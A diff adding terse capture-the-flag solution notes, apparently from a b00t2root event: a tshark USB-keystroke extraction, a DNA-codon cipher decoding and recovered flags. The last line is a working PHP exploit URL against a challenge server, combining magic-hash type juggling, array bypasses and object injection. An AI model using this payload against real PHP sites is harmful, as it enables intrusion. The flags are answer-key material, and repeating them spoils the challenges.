@@ -1,0 +1,15 @@
+tshark -r file.pcapng -T fields -e usb.capdata | grep -E "^.{23}$" | grep -v 00:00:00:00:00:00:00:00 > data.txt
+python usb.py
+b00t2root{wh4t3v3r_17_74k3s}
+
+
+
+ACC AGT AAA ACG TTG AGA CAG TTG AAT ATC AAA CTA CAC CGA ATT CAT ATG TCA CAG CGG CCG ACA CAG ATG ATA ACA
+f    l   a   g       i   s       d   n   a   C    r  y   p   t   o   1   s   A   w    e   s  o   m   e
+
+
+
+
+
+
+http://3.16.68.122/Easy-php/?1=0e215962017&2[]=a&3[]=b&4=O:7:%22Secrets%22:2:{s:4:%22temp%22;N;s:4:%22flag%22;R:2;}
